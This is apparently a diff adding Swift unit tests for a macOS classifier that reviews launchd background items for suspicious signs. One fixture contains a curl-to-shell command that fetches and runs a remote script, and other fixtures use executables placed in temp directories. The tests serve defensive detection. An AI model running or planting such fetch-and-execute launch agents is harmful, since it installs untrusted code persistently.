@@ -188,6 +188,78 @@ struct SafetyClassifierSuspiciousTests {
         #expect(result.reasons.contains(.shellInvocation))
     }
 
+    @Test("Combined short-flag cluster (bash -lc) is treated as -c")
+    func combinedFlagClusterIsFlagged() {
+        let plist = LaunchdPlist(
+            label: "com.example.lc",
+            programArguments: ["/bin/bash", "-lc", "curl -fsSL https://x.sh | sh"]
+        )
+        let input = BackgroundItemClassifierInput(
+            label: "com.example.lc",
+            source: .userLaunchAgent,
+            plistPath: "/tmp/com.example.lc.plist",
+            executablePath: "/bin/bash",
+            identity: nil,
+            executableExists: true,
+            plist: plist
+        )
+        let result = classifier.classify(input)
+        #expect(result.safety == .review)
+        #expect(result.reasons.contains(.shellInvocation))
+    }
+
+    @Test("Benign words containing pattern substrings are not flagged (retrieval ≠ eval)")
+    func benignSubstringsAreNotFlagged() {
+        let plist = LaunchdPlist(
+            label: "com.example.notes",
+            programArguments: ["/bin/sh", "-c", "process --retrieval mode --curly-braces"]
+        )
+        let input = BackgroundItemClassifierInput(
+            label: "com.example.notes",
+            source: .userLaunchAgent,
+            plistPath: "/tmp/com.example.notes.plist",
+            executablePath: "/bin/sh",
+            identity: nil,
+            executableExists: true,
+            plist: plist
+        )
+        #expect(!classifier.classify(input).reasons.contains(.shellInvocation))
+    }
+
+    @Test("Uppercase temp paths are caught on the case-insensitive filesystem")
+    func uppercaseTempPathIsFlagged() {
+        let input = BackgroundItemClassifierInput(
+            label: "com.example.shout",
+            source: .userLaunchAgent,
+            plistPath: "/tmp/com.example.shout.plist",
+            executablePath: "/TMP/evil",
+            identity: nil,
+            executableExists: true,
+            plist: nil
+        )
+        let result = classifier.classify(input)
+        #expect(result.safety == .review)
+        #expect(result.reasons.contains(.suspiciousExecutablePath))
+    }
+
+    @Test("Suspicious early return still carries the unsigned evidence chip")
+    func suspiciousCarriesUnsignedChip() {
+        let identity = BinaryIdentity(binaryPath: "/tmp/tool", vendor: .unsigned)
+        let input = BackgroundItemClassifierInput(
+            label: "com.example.tool",
+            source: .userLaunchAgent,
+            plistPath: "/tmp/com.example.tool.plist",
+            executablePath: "/tmp/tool",
+            identity: identity,
+            executableExists: true,
+            plist: nil
+        )
+        let result = classifier.classify(input)
+        #expect(result.safety == .review)
+        #expect(result.reasons.contains(.suspiciousExecutablePath))
+        #expect(result.reasons.contains(.unsigned))
+    }
+
     // MARK: - Interaction with earlier rules
 
     @Test("Missing executable in a temp dir stays safe via rule 3, but the suspicious chip survives")
